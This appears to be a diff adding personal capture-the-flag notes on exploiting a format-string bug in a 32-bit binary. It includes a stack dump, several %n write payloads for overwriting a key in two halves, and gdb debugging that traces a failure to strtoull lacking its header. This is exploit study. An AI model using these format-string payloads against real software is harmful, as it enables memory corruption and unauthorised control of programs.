@@ -1,0 +1,69 @@
+just my thought process if you're interested 
+
+lead is to overwrite the key perhaps or leak it?
+seems like leaking the key is the better idea but i'm not sure how
+
+or maybe somehow overwrite strtoull to be system? I don't think it's possible
+
+
+maybe control eip by overwriting the return address to land into the congratz? but the args would not be there where i expected
+
+
+overwrite printf to be system?
+actually why wouldn't that work. because i can't 
+
+it seems to me that i might need to overwrite the key
+the idea is maybe to find an address somewhere on the stack that points to the stack, and use %n on it
+
+dump of the stack
+
+804a100|64|0|0|0|0|0|0|8048870|0|0|ffdb1e40|ffdb3fcd|ffdaf9e0|ffdaf9e4|0|0|ffdb1c78|8048791|0|0|0|0|0|0|0|0|0|0|0|0|0|0|
+
+
+maybe we can use that 0xffdaf9e0 value
+only 80 bytes away from the stack pointer
+I think that we can use it
+
+need to use 13 dwords and the 14th will be the right one
+
+so first payload should be for first 4 bytes:
+%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520832x%naaaaaaaaaaaa
+
+then to confirm:
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x(%x)aaaaaaaaaaaaaaaaaaa
+
+override it with a number:
+%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%naa
+
+second payload for second 4 bytes:
+%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520836x%naaaaaaaaaaaa
+
+
+so do first payload
+override
+second payload
+override
+and that should work
+
+need to apply padding to the payloads becayse buf is not cleared between iterations
+
+cause i'm lazy i will break in puts before sleep and see the key value
+gdb-peda$ p (unsigned long long)key
+$1 = 0x9800000098
+
+
+weirdly it doesn't work?
+also dumping the key from gdb doesn't work as expected and putting it in the program seems to not work?
+
+   0x08048676 <+322>:	call   0x8048460 <strtoull@plt>
+   0x0804867b <+327>:	mov    edx,eax
+   0x0804867d <+329>:	sar    edx,0x1f
+
+
+lmfao wtf...
+either i am missing something here this didn't compile right?
+
+according to stackoverflow:
+https://stackoverflow.com/questions/1646031/strtoull-and-long-long-arithmetic
+
+the function is treated as an int because the source code lacks #include <stdlib.h>
